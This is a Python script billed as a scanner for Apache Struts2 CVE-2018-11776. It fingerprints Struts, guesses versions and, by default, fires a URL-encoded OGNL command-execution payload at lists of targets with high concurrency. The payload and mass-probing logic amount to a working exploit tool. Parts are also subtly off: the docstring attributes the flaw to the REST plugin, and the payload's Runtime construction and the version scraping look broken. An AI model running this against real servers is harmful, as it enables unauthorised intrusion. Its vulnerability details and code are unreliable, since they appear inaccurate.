#!/usr/bin/env python3
"""
Apache Struts2 CVE-2018-11776 Scanner
=====================================
This is a vulnerability scanner for Apache Struts2 REST Plugin namespace
remote code execution (RCE) vulnerability (CVE-2018-11776, CVSS 9.8).

CVE-2018-11776 details:
  - Affects Apache Struts2 versions prior to 2.3.35 and 2.5.17
  - Vulnerability caused by improper namespace handling in Struts2 REST plugin
  - Allows unauthenticated remote attackers to execute arbitrary commands
  - Exploitable when using forced OGNL expression in crafted input
  - Exploit often involves adding malicious payloads in crafted URL paths
  
This vulnerability has been actively exploited in the wild, making it a high-priority
issue to identify during security testing.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target
  python struts2_rce_scanner.py --target https://example.com

  # Scan a list of targets
  python struts2_rce_scanner.py --list targets.txt --output findings.json

  # Safe mode (detection only, no RCE probing)
  python struts2_rce_scanner.py --list targets.txt --safe

  # Set custom concurrency for scanning multiple hosts
  python struts2_rce_scanner.py --list targets.txt --concurrency 50

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11776
  - https://struts.apache.org/docs/s2-057.html
  - https://nvd.nist.gov/vuln/detail/CVE-2018-11776
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
from urllib.parse import urljoin

# Constants
STRUTS_FINGERPRINTS = [
    "<title>Apache Struts2",
    "org.apache.struts",
    "struts-tags",
]

VULN_FIXED_VERSIONS = {
    "2.3": (2, 3, 35),
    "2.5": (2, 5, 17),
}

RCE_PAYLOAD = "/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23a%3D%28%27java.lang.Runtime%27%29.newInstance%28%29.exec%28%27echo%20testRCE%27%29%29%7D/"
RCE_VERIFY_TEXT = "testRCE"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Helper Functions
def parse_version(version_string):
    """Parse version string into tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split(".")))
    except Exception:
        return None

def is_vulnerable(version_string):
    """Determine if the extracted version is vulnerable."""
    parsed_version = parse_version(version_string)
    if not parsed_version:
        return None
    major_minor = f"{parsed_version[0]}.{parsed_version[1]}"
    return (
        major_minor in VULN_FIXED_VERSIONS
        and parsed_version < VULN_FIXED_VERSIONS[major_minor]
    )

def normalize_url(url):
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

# Core Scanner Functions
async def detect_struts(client, base_url, semaphore):
    """Check if a URL is using Apache Struts2."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                for fingerprint in STRUTS_FINGERPRINTS:
                    if fingerprint in response.text:
                        return True
        except Exception:
            pass
    return False

async def extract_version(client, base_url, semaphore):
    """Attempt to extract Apache Struts2 version from the target."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            match = re.search(r"Apache Struts(?:\s2)?\s(?:version\s)?(\d+\.\d+\.\d+)", response.text, re.IGNORECASE)
            if match:
                return match.group(1)
        except Exception:
            pass
    return None

async def check_rce(client, base_url, semaphore):
    """
    Attempt to exploit the RCE vulnerability by sending a malicious payload. 
    
    Returns:
        - True if the target is exploitable.
        - False if the target is safe.
    """
    async with semaphore:
        target_url = urljoin(base_url, RCE_PAYLOAD)
        try:
            response = await client.get(target_url, timeout=REQUEST_TIMEOUT)
            if RCE_VERIFY_TEXT in response.text:
                return True
        except Exception:
            pass
    return False

async def scan_target(client, url, semaphore, detection_only):
    """Scan a single target for Struts2 and CVE-2018-11776 vulnerability."""
    result = {
        "target": url,
        "detected_struts": False,
        "version": None,
        "vulnerable": False,
        "rce_exploitable": False,
    }

    url = normalize_url(url)

    # Detect Struts2
    detected = await detect_struts(client, url, semaphore)
    result["detected_struts"] = detected
    if not detected:
        return result

    # Extract version
    version = await extract_version(client, url, semaphore)
    result["version"] = version
    if version:
        result["vulnerable"] = is_vulnerable(version)

    # Check for RCE vulnerability if not in safe mode
    if not detection_only and result["vulnerable"]:
        result["rce_exploitable"] = await check_rce(client, url, semaphore)

    return result

async def main(targets, output_file, detection_only, concurrency, verify_ssl):
    semaphore = asyncio.Semaphore(concurrency)
    client = httpx.AsyncClient(follow_redirects=True, verify=verify_ssl)
    tasks = [scan_target(client, target, semaphore, detection_only) for target in targets]

    results = await asyncio.gather(*tasks)

    for result in results:
        if result["rce_exploitable"]:
            print(f"\033[31m[CRITICAL] Vulnerable RCE found: {result['target']}\033[0m")
        elif result["vulnerable"]:
            print(f"\033[33m[HIGH] Vulnerable version detected: {result['target']} - Version: {result['version']}\033[0m")
        elif result["detected_struts"]:
            print(f"\033[32m[INFO] Apache Struts detected: {result['target']} - Version: {result['version'] if result['version'] else 'Unknown'}\033[0m")
        else:
            print(f"[INFO] Not Apache Struts: {result['target']}")

    if output_file:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)

    await client.aclose()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Apache Struts2 CVE-2018-11776 Scanner"
    )
    parser.add_argument("--target", help="Single target URL to scan")
    parser.add_argument("--list", help="File containing list of target URLs")
    parser.add_argument("--output", help="Write results to JSON file")
    parser.add_argument("--safe", action="store_true", help="Detection mode only, no RCE probing")
    parser.add_argument("--concurrency", type=int, default=30, help="Concurrent scans (default: 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate validation")

    args = parser.parse_args()

    if not args.target and not args.list:
        print("Error: You must specify either --target or --list")
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend([line.strip() for line in f if line.strip()])

    if not targets:
        print("Error: No valid targets provided")
        sys.exit(1)

    asyncio.run(main(targets, args.output, args.safe, args.concurrency, not args.no_verify))
